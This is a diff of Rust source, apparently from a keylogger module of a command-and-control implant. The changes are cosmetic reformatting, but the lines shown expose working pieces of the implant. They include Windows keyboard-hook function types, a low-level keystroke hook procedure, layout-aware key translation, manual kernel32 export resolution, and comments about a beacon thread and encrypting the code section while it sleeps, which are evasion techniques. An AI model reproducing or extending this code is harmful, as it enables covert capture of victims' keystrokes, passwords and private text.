@@ -172,13 +172,13 @@ type GetKeyboardLayoutFn = unsafe extern "system" fn(u32) -> Hkl;
 type GetKeyboardStateFn = unsafe extern "system" fn(*mut u8) -> i32;
 type MapVirtualKeyExWFn = unsafe extern "system" fn(u32, u32, Hkl) -> u32;
 type ToUnicodeExFn = unsafe extern "system" fn(
-    u32,   // wVirtKey
-    u32,   // wScanCode
+    u32,       // wVirtKey
+    u32,       // wScanCode
     *const u8, // lpKeyState[256]
     *mut u16,  // lpChar[N]
-    i32,  // cchBuffer
-    u32,  // wFlags
-    Hkl,  // dwhkl
+    i32,       // cchBuffer
+    u32,       // wFlags
+    Hkl,       // dwhkl
 ) -> i32;
 
 /// Resolve & cache `GetKeyboardLayout`. Returns the function pointer, or `None`
@@ -311,26 +311,26 @@ struct HookRaw {
 
 /// `SetWindowsHookExW` signature.
 type SetWindowsHookExWFn = unsafe extern "system" fn(
-    i32,           // idHook
-    *const (),     // lpfn (the hook callback)
+    i32,                    // idHook
+    *const (),              // lpfn (the hook callback)
     *mut core::ffi::c_void, // hmod (the DLL containing lpfn; null for LL hooks)
-    u32,           // dwThreadId (0 = all existing threads)
+    u32,                    // dwThreadId (0 = all existing threads)
 ) -> *mut core::ffi::c_void; // HHOOK
 /// `UnhookWindowsHookEx`.
 type UnhookWindowsHookExFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
 /// `CallNextHookEx`.
 type CallNextHookExFn = unsafe extern "system" fn(
     *mut core::ffi::c_void, // hhk (ignored for LL hooks)
-    i32,    // nCode
-    usize,  // wParam
-    isize,  // lParam
+    i32,                    // nCode
+    usize,                  // wParam
+    isize,                  // lParam
 ) -> isize;
 /// `GetMessageW` — blocks the calling thread until a window message arrives.
 type GetMessageWFn = unsafe extern "system" fn(
-    *mut Msg, // lpMsg
+    *mut Msg,               // lpMsg
     *mut core::ffi::c_void, // hWnd (null = any window)
-    u32,    // wMsgFilterMin
-    u32,    // wMsgFilterMax
+    u32,                    // wMsgFilterMin
+    u32,                    // wMsgFilterMax
 ) -> i32;
 /// `PostThreadMessageW` — how the beacon thread signals `WM_QUIT`.
 type PostThreadMessageWFn = unsafe extern "system" fn(
@@ -416,9 +416,15 @@ fn resolve_hook_raw() -> Option<HookRaw> {
     let get_keyboard_layout = get_keyboard_layout_fn()
         .map(|f| f as *const () as usize)
         .unwrap_or(0);
-    let get_keyboard_state = get_keyboard_state_fn().map(|f| f as *const () as usize).unwrap_or(0);
-    let map_virtual_key_ex_w = map_virtual_key_ex_fn().map(|f| f as *const () as usize).unwrap_or(0);
-    let to_unicode_ex = to_unicode_ex_fn().map(|f| f as *const () as usize).unwrap_or(0);
+    let get_keyboard_state = get_keyboard_state_fn()
+        .map(|f| f as *const () as usize)
+        .unwrap_or(0);
+    let map_virtual_key_ex_w = map_virtual_key_ex_fn()
+        .map(|f| f as *const () as usize)
+        .unwrap_or(0);
+    let to_unicode_ex = to_unicode_ex_fn()
+        .map(|f| f as *const () as usize)
+        .unwrap_or(0);
     Some(HookRaw {
         set_windows_hook_ex_w,
         unhook_windows_hook_ex,
@@ -514,11 +520,7 @@ unsafe extern "system" fn keylog_hook_thread(param: usize) -> u32 {
 /// [`hook_is_active`] and degrades when this thread is live — if it ever runs
 /// during a `.text`-encrypt window it would execute ciphertext. The gate in
 /// `sleep.rs` is the guard.
-unsafe extern "system" fn keylog_hook_proc(
-    n_code: i32,
-    w_param: usize,
-    l_param: isize,
-) -> isize {
+unsafe extern "system" fn keylog_hook_proc(n_code: i32, w_param: usize, l_param: isize) -> isize {
     // We only act on HC_ACTION + a keydown message.
     if n_code != HC_ACTION {
         // SAFETY: call_next is a valid fn pointer resolved by the hook thread;
@@ -547,8 +549,7 @@ unsafe extern "system" fn keylog_hook_proc(
 /// Re-resolve `CallNextHookEx` from inside the hook callback (it can't see the
 /// `HookRaw` bundle directly). Cached after first call via a static.
 unsafe fn call_next_hook_resolved(n_code: i32, w_param: usize, l_param: isize) -> isize {
-    static CNH_ADDR: core::sync::atomic::AtomicUsize =
-        core::sync::atomic::AtomicUsize::new(0);
+    static CNH_ADDR: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
     let cached = CNH_ADDR.load(core::sync::atomic::Ordering::Relaxed);
     let addr = if cached != 0 {
         cached
@@ -674,10 +675,10 @@ fn map_vkey_layout_aware(vk: i32, shift: bool) -> Option<u8> {
 
     // Control / whitespace keys always map 1:1 (no layout dependency).
     match vk {
-        0x08 => return Some(0x08), // Backspace
-        0x09 => return Some(0x09), // Tab
-        0x0D => return Some(b'\n'), // Enter
-        0x20 => return Some(b' '), // Space
+        0x08 => return Some(0x08),         // Backspace
+        0x09 => return Some(0x09),         // Tab
+        0x0D => return Some(b'\n'),        // Enter
+        0x20 => return Some(b' '),         // Space
         0x10 | 0x11 | 0x12 => return None, // Shift/Ctrl/Alt modifiers
         _ => {}
     }
@@ -929,7 +930,8 @@ fn stop_hook_thread() {
         let _ = unsafe { wait(handle as *mut core::ffi::c_void, 2000) };
     }
     // Close the thread handle via raw kernel32 export.
-    if let Some(close_addr) = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }
+    if let Some(close_addr) =
+        unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }
     {
         type CloseFn = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
         let close: CloseFn = unsafe { core::mem::transmute(close_addr) };
